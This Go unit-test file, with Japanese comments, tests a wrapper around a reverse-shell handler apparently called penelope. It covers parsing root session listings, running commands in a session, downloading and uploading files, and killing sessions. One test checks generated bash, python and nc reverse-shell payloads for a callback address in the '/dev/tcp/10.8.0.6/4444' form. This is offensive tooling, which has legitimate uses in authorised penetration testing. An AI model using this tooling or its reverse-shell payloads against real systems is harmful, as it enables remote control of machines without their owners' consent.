package server

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// 以下の fixture は 2026-09-13 のテスト機(penelope --mcp)が実際に返した text block の内容。
const (
	penListFixture = `{
  "sessions": [
    {
      "id": 1,
      "name": "ubuntu~127.0.0.1-Linux-x86_64",
      "ip": "127.0.0.1",
      "port": 39960,
      "OS": "Unix",
      "type": "Raw",
      "subtype": null,
      "user": "root(0)",
      "source": "reverse"
    }
  ]
}`
	penInfoFixture = `{
  "id": 1,
  "name": "ubuntu~127.0.0.1-Linux-x86_64",
  "ip": "127.0.0.1",
  "port": 39960,
  "OS": "Unix",
  "type": "Raw",
  "subtype": null,
  "user": "root(0)",
  "source": "reverse",
  "hostname": "ubuntu",
  "system": "Linux",
  "arch": "x86_64",
  "cwd": "/root"
}`
	penExecFixture = `{
  "output": "uid=0(root) gid=0(root) groups=0(root)\nubuntu"
}`
	penListEmptyFixture = `{
  "sessions": []
}`
)

func TestParsePenSessions(t *testing.T) {
	ss, err := parsePenSessions(penListFixture)
	if err != nil {
		t.Fatal(err)
	}
	if len(ss) != 1 {
		t.Fatalf("期待するセッションは 1 件、実際は %d", len(ss))
	}
	s := ss[0]
	if s.ID != 1 || s.IP != "127.0.0.1" || s.Port != 39960 || s.OS != "Unix" || s.User != "root(0)" || s.Source != "reverse" {
		t.Fatalf("フィールドが不一致: %+v", s)
	}
	empty, err := parsePenSessions(penListEmptyFixture)
	if err != nil || len(empty) != 0 {
		t.Fatalf("空リストの解析が不一致: %v %v", empty, err)
	}
	if _, err := parsePenSessions("not json"); err == nil {
		t.Fatal("壊れた JSON はエラーになるべき")
	}
}

func TestParsePenInfo(t *testing.T) {
	ps, err := parsePenInfo(penInfoFixture)
	if err != nil {
		t.Fatal(err)
	}
	if ps.Hostname != "ubuntu" || ps.System != "Linux" || ps.Arch != "x86_64" || ps.CWD != "/root" {
		t.Fatalf("info フィールドが不一致: %+v", ps)
	}
}

func TestParseExecOutput(t *testing.T) {
	out, err := parseExecOutput(penExecFixture)
	if err != nil {
		t.Fatal(err)
	}
	if out != "uid=0(root) gid=0(root) groups=0(root)\nubuntu" {
		t.Fatalf("output が不一致: %q", out)
	}
	if _, err := parseExecOutput(`{"error":"exec failed or session not ready"}`); err == nil {
		t.Fatal("error フィールドは上に伝播すべき")
	}
}

func TestParseStringList(t *testing.T) {
	got, err := parseStringList("downloaded", `{"downloaded":["/root/.penelope/sessions/x/downloads/etc/hostname"]}`)
	if err != nil || len(got) != 1 || !strings.HasSuffix(got[0], "etc/hostname") {
		t.Fatalf("downloaded の解析が不一致: %v %v", got, err)
	}
	if _, err := parseStringList("uploaded", `{"downloaded":[]}`); err == nil {
		t.Fatal("キーがない場合はエラーになるべき")
	}
}

func TestSplitRemotePath(t *testing.T) {
	cases := []struct{ in, dir, base string }{
		{"/a/b/c.txt", "/a/b", "c.txt"},
		{"/c.txt", "/", "c.txt"},
		{"c.txt", "", "c.txt"},
		{"/", "/", ""},
		{"", "", ""},
	}
	for _, c := range cases {
		dir, base := splitRemotePath(c.in)
		if dir != c.dir || base != c.base {
			t.Fatalf("splitRemotePath(%q)=(%q,%q)、期待は(%q,%q)", c.in, dir, base, c.dir, c.base)
		}
	}
}

func TestDiffPenSessions(t *testing.T) {
	known := map[int]int64{1: 10, 2: 11}
	newIDs, dead := diffPenSessions([]int{2, 3}, known)
	if len(newIDs) != 1 || newIDs[0] != 3 {
		t.Fatalf("newIDs が不一致: %v", newIDs)
	}
	if len(dead) != 1 || dead[1] != 10 {
		t.Fatalf("dead が不一致: %v", dead)
	}
	newIDs, dead = diffPenSessions([]int{1, 2}, known)
	if len(newIDs) != 0 || len(dead) != 0 {
		t.Fatalf("全量が重なる場合は空の diff になるべき: %v %v", newIDs, dead)
	}
}

func TestReversePayloads(t *testing.T) {
	p := reversePayloads("10.8.0.6", 4444)
	for _, k := range []string{"bash", "python", "nc"} {
		if !strings.Contains(p[k], "10.8.0.6") || !strings.Contains(p[k], "4444") {
			t.Fatalf("payload %s に接続先アドレスがない: %q", k, p[k])
		}
	}
	if !strings.Contains(p["bash"], "/dev/tcp/10.8.0.6/4444") {
		t.Fatalf("bash payload の形式が不一致: %q", p["bash"])
	}
}

// fakeMCP は単体テスト用の偽 mcpCaller:ツール名ごとに固定の応答を返し、呼び出しパラメータを記録する。
type fakeMCP struct {
	responses map[string]string // tool → text block の内容
	err       map[string]error
	calls     []map[string]any
}

func (f *fakeMCP) Call(_ context.Context, tool string, args any) (string, error) {
	f.calls = append(f.calls, map[string]any{"tool": tool, "args": args})
	if err, ok := f.err[tool]; ok {
		return "", err
	}
	if r, ok := f.responses[tool]; ok {
		return r, nil
	}
	return "", fmt.Errorf("unexpected tool %q", tool)
}

func TestReverseShellExec(t *testing.T) {
	fm := &fakeMCP{responses: map[string]string{"exec_in_session": penExecFixture}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	stdout, stderr, err := sh.Exec(context.Background(), "id; hostname", 5*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	if stderr != "" {
		t.Fatalf("reverse チャネルの stderr は常に空のはず、実際は %q", stderr)
	}
	if !strings.Contains(stdout, "uid=0(root)") {
		t.Fatalf("stdout が不一致: %q", stdout)
	}
	args := fm.calls[0]["args"].(map[string]any)
	if args["session_id"] != 1 || args["command"] != "id; hostname" {
		t.Fatalf("MCP 引数が不一致: %v", args)
	}
}

func TestReverseShellExecDeadSession(t *testing.T) {
	// penelope は未知/死んだセッションに対して JSON-RPC -32602 を返す(mcphttp.Call では error として上に伝わる)。
	fm := &fakeMCP{err: map[string]error{"exec_in_session": fmt.Errorf("mcp rpc error -32602: session 1 not found")}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	if _, _, err := sh.Exec(context.Background(), "id", 0); err == nil ||
		!strings.Contains(err.Error(), "not found") {
		t.Fatalf("死んだセッションのエラーはそのまま上に伝播すべき: %v", err)
	}
}

func TestReverseShellTestProbe(t *testing.T) {
	// Test は echo のセンチネルを送り、そのエコーが返ってきたときだけ生存と見なす。ここでは偽 MCP がコマンド自体をそのまま返す。
	fm := &fakeMCP{responses: map[string]string{}}
	fm.responses["exec_in_session"] = ""
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	// エコーが空 → センチネルが返らない → エラー
	if err := sh.Test(context.Background()); err == nil {
		t.Fatal("センチネルが返らなければエラーになるべき")
	}
}

func TestReverseShellReadFile(t *testing.T) {
	// penelope のダウンロードがローカルに落ちる様子を模擬:まずローカルファイルを作り、偽 MCP がそのパスを返す。
	local := filepath.Join(t.TempDir(), "hostname")
	if err := os.WriteFile(local, []byte("ubuntu\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	fm := &fakeMCP{responses: map[string]string{
		"download_from_session": fmt.Sprintf(`{"downloaded":[%q]}`, local),
	}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	data, err := sh.ReadFile(context.Background(), "/etc/hostname")
	if err != nil {
		t.Fatal(err)
	}
	if string(data) != "ubuntu\n" {
		t.Fatalf("内容が不一致: %q", data)
	}
	args := fm.calls[0]["args"].(map[string]any)
	if args["remote_path"] != "/etc/hostname" {
		t.Fatalf("remote_path が不一致: %v", args)
	}
}

func TestReverseShellReadFileMultiMatch(t *testing.T) {
	fm := &fakeMCP{responses: map[string]string{
		"download_from_session": `{"downloaded":["/a","/b"]}`,
	}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	if _, err := sh.ReadFile(context.Background(), "/etc/ho*"); err == nil ||
		!strings.Contains(err.Error(), "正確なパス") {
		t.Fatalf("複数一致の場合は正確なパスを求めるエラーになるべき: %v", err)
	}
}

func TestReverseShellWriteFile(t *testing.T) {
	fm := &fakeMCP{responses: map[string]string{
		"upload_to_session": `{"uploaded":["/tmp/up.txt"]}`,
	}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	if err := sh.WriteFile(context.Background(), "/tmp/up.txt", []byte("ARTEXUPLOADTEST")); err != nil {
		t.Fatal(err)
	}
	args := fm.calls[0]["args"].(map[string]any)
	// remote_path はディレクトリでなければならない(実測のセマンティクス)。local_path の basename は対象の basename と一致する必要がある。
	if args["remote_path"] != "/tmp" {
		t.Fatalf("remote_path はディレクトリであるべき: %v", args)
	}
	if filepath.Base(fmt.Sprint(args["local_path"])) != "up.txt" {
		t.Fatalf("local_path の basename は対象のファイル名を保持すべき: %v", args["local_path"])
	}
}

func TestReverseShellWriteFileEmptyUpload(t *testing.T) {
	// penelope は書き込めないディレクトリ/非永続 shell に対して {"uploaded":[]} を返す(実測)ので、必ずエラーにして成功扱いしない。
	fm := &fakeMCP{responses: map[string]string{
		"upload_to_session": `{"uploaded":[]}`,
	}}
	sh := &reverseShell{id: 7, penID: 1, caller: fm}
	if err := sh.WriteFile(context.Background(), "/root/x", []byte("x")); err == nil {
		t.Fatal("空の uploaded はエラーになるべき")
	}
}

func TestReverseShellClose(t *testing.T) {
	fm := &fakeMCP{responses: map[string]string{"kill_session": `{"ok":true}`}}
	sh := &reverseShell{id: 7, penID: 3, caller: fm}
	if err := sh.Close(context.Background()); err != nil {
		t.Fatal(err)
	}
	args := fm.calls[0]["args"].(map[string]any)
	if args["session_id"] != 3 {
		t.Fatalf("kill_session の引数が不一致: %v", args)
	}
	// セッションが既に死んでいても(kill が -32602 を返す)エラーにしない。Registry のクリーンアップのセマンティクス。
	fm.err = map[string]error{"kill_session": fmt.Errorf("mcp rpc error -32602: session 3 not found")}
	if err := sh.Close(context.Background()); err != nil {
		t.Fatalf("死んだセッションの Close はエラーを飲み込むべき: %v", err)
	}
}
